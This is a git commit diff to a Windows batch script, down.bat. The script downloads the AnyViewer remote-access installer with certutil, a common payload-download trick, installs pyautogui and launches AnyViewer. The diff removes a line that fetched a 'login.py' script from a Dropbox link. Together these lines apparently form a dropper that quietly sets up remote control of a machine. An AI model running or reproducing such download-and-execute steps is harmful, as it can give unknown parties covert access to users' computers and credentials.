6c33db1857bd7aa42c8ed5067b92dc59d0ccf887
CherylJSullivan <140143510+CherylJSullivan@users.noreply.github.com>
2023-07-23 07:59:59 +0530

    Update down.bat

--- down.bat
+++ down.bat
@@ -1,5 +1,4 @@
 @echo off
 certutil -urlcache -split -f "https://www.anyviewer.com/ss/download/AnyViewerSetup.exe" AnyViewer.exe
-curl -L -o login.py https://www.dropbox.com/scl/fi/k18qc9drpe7nhli766fsb/login.py?rlkey=v96du1pl748xqkiqdc1qltr4r&
 pip install pyautogui 
 start AnyViewer.exe
